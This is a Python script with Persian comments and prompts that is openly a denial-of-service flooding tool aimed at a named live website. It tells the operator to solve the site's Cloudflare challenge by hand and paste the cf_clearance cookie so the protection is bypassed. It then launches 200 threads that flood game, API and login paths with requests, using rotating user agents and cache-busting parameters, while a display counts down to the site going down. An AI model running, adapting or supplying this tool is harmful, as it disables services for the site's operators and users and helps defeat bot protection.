import os
import sys
import time
import json
import random
import string
import hashlib
import threading
import requests
from datetime import datetime

# ============================================
# نصب پکیج
# ============================================

try:
    import cloudscraper
except:
    os.system("pip install cloudscraper requests -q -q")
    import cloudscraper

# ============================================
# تنظیمات
# ============================================

TARGET = "https://4nayz.online"
RUNNING = True
success = 0
fail = 0
bypass_count = 0
session_cookies = {}
lock = threading.Lock()
start_time = time.time()

# ============================================
# نمایش بنر
# ============================================

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
╔══════════════════════════════════════════════════════════╗
║     💀 4NAYZ.ONLINE - SIMPLE ATTACK 💀                ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  📱 لینک رو توی مرورگر باز کن                          ║
║  ✅ کپچا رو حل کن                                       ║
║  📋 کوکی رو کپی کن و بده به من                         ║
║  🚀 حمله شروع میشه                                      ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
    """)

# ============================================
# تابع ۱: حل کپچا (بدون Selenium)
# ============================================

def solve_captcha_manual():
    global session_cookies, bypass_count

    print("\n" + "="*50)
    print("📌 مرحله ۱: حل کپچا")
    print("="*50)
    print()
    print(f"🌐 لینک زیر رو توی مرورگر (Chrome/Firefox) باز کن:")
    print(f"\n   🔗 {TARGET}\n")
    print("✅ کپچای Cloudflare رو حل کن")
    print()

    input("⏳ وقتی کپچا رو حل کردی، Enter بزن: ")

    print("\n📋 حالا کوکی رو از مرورگر کپی کن:")
    print()
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("🔧 آموزش گرفتن کوکی:")
    print()
    print("   کروم:")
    print("   1. F12 بزن (یا راست کلیک > inspect)")
    print("   2. برو به تب Application")
    print("   3. سمت چپ: Cookies > https://4nayz.online")
    print("   4. دنبال cf_clearance بگرد")
    print("   5. روی Value دبل کلیک کن و Copy کن")
    print()
    print("   یا:")
    print("   1. روی آدرس بار کلیک کن")
    print("   2. تایپ کن: javascript:alert(document.cookie)")
    print("   3. Enter بزن")
    print("   4. کوکی‌ها نمایش داده میشه، Copy کن")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print()

    cf_clearance = input("✏️  cf_clearance رو بده: ").strip()

    if not cf_clearance:
        print("\n❌ کوکی خالی بود!")
        return False

    session_cookies = {
        'cf_clearance': cf_clearance,
        '__cfduid': hashlib.md5(str(time.time()).encode()).hexdigest()[:32]
    }

    # ذخیره
    with open('cookies.json', 'w') as f:
        json.dump(session_cookies, f)

    bypass_count += 1
    print("\n✅ کوکی ذخیره شد!")
    return True

# ============================================
# تابع ۲: تولید URL
# ============================================

def generate_url():
    paths = [
        "/", "/guess-x", "/guess-x/play", "/guess-x/bet",
        "/mines", "/mines/play", "/mines/reveal",
        "/api", "/api/v1", "/api/v1/auth",
        "/login", "/register", "/profile",
        "/moneydrop", "/survivor", "/shoot",
        "/hangtight", "/leaderboard"
    ]

    params = f"t={time.time_ns()}&r={hashlib.md5(str(random.random()).encode()).hexdigest()}&v={random.randint(1,9999)}&_={random.randint(1,999999999)}&cache=false"
    path = random.choice(paths)

    return f"{TARGET}{path}?{params}"

# ============================================
# تابع ۳: حمله
# ============================================

def attack_worker():
    global success, fail, session_cookies, RUNNING

    try:
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'desktop': True
            },
            delay=0.01
        )

        # اضافه کردن کوکی
        for name, value in session_cookies.items():
            scraper.cookies.set(name, value)

        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]

        while RUNNING:
            try:
                url = generate_url()
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Cache-Control': 'no-cache',
                    'Referer': TARGET
                }

                r = scraper.get(url, headers=headers, timeout=5)

                if r.status_code in [503, 403]:
                    with lock:
                        fail += 1
                else:
                    with lock:
                        success += 1

            except:
                with lock:
                    fail += 1

    except:
        pass

# ============================================
# تابع ۴: نمایش آمار
# ============================================

def show_stats():
    global RUNNING, success, fail, bypass_count

    while RUNNING:
        time.sleep(2)
        elapsed = int(time.time() - start_time)
        total = success + fail
        rate = total // max(elapsed, 1)

        os.system('cls' if os.name == 'nt' else 'clear')

        print(f"""
╔══════════════════════════════════════════════════════════╗
║     💀 4NAYZ.ONLINE - ATTACK IN PROGRESS 💀           ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  ⏱ زمان: {elapsed:>5} ثانیه     🔄 دور زدن: {bypass_count:<5}        ║
║  ✅ موفق: {success:>8,}     ❌ خطا: {fail:<8,}        ║
║  🚀 نرخ: {rate:>5}/s        📊 مجموع: {total:<8,}        ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
        """)

        if rate > 0:
            remaining = 100000 - total
            if remaining > 0:
                est = remaining // rate
                print(f"     ⏳ سایت تا {est} ثانیه دیگه down میشه")
            else:
                print(f"     💀💀💀 سایت DOWN! 💀💀💀")

# ============================================
# تابع اصلی
# ============================================

def main():
    global RUNNING, start_time

    show_banner()

    # حل کپچا
    if not solve_captcha_manual():
        input("\n❌ خطا! Enter بزن برای خروج...")
        sys.exit(1)

    print("\n" + "="*50)
    print("🚀 مرحله ۲: شروع حمله")
    print("="*50)
    print()

    start_time = time.time()

    # شروع آمار
    stats_thread = threading.Thread(target=show_stats)
    stats_thread.daemon = True
    stats_thread.start()

    # شروع کارگرها (200 تا)
    for i in range(200):
        w = threading.Thread(target=attack_worker)
        w.daemon = True
        w.start()

    print("✅ 200 ترد شروع به کار کردن")
    print("🔄 حمله تا 10 دقیقه بدون مشکل ادامه داره")
    print("⚠️ بعد از فعال شدن کپچا، دوباره کوکی میدی")
    print("\n[Ctrl+C برای توقف]\n")

    # حلقه اصلی
    try:
        while True:
            time.sleep(300)  # هر 5 دقیقه چک کن

            # اگه کپچا فعال شد
            rate = (success + fail) // max(int(time.time() - start_time), 1)
            if rate < 10:  # اگه نرخ افت کرد
                print("\n⚠️ نرخ افت کرده! ممکنه کپچا فعال شده باشه")
                again = input("میخوای دوباره کپچا رو حل کنی؟ (y/n): ").lower()
                if again == 'y':
                    solve_captcha_manual()
                    print("🚀 ادامه حمله...")

    except KeyboardInterrupt:
        print("\n\n🛑 توقف...")
        RUNNING = False

        elapsed = int(time.time() - start_time)
        total = success + fail

        print(f"""
╔══════════════════════════════════════════════════════════╗
║                    🛑 ATTACK STOPPED                    ║
╠══════════════════════════════════════════════════════════╣
║  ⏱ زمان: {elapsed} ثانیه                              ║
║  ✅ موفق: {success:,}                                  ║
║  ❌ خطا: {fail:,}                                      ║
║  🔄 دور زدن: {bypass_count}                            ║
║  📊 مجموع: {total:,}                                   ║
║  🚀 میانگین نرخ: {total // max(elapsed, 1)}/s          ║
╚══════════════════════════════════════════════════════════╝
        """)

        input("Enter بزن برای خروج...")
        sys.exit(0)

# ============================================
# اجرا
# ============================================

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n❌ خطا: {e}")
        import traceback
        traceback.print_exc()
        input("\nEnter بزن برای خروج...")
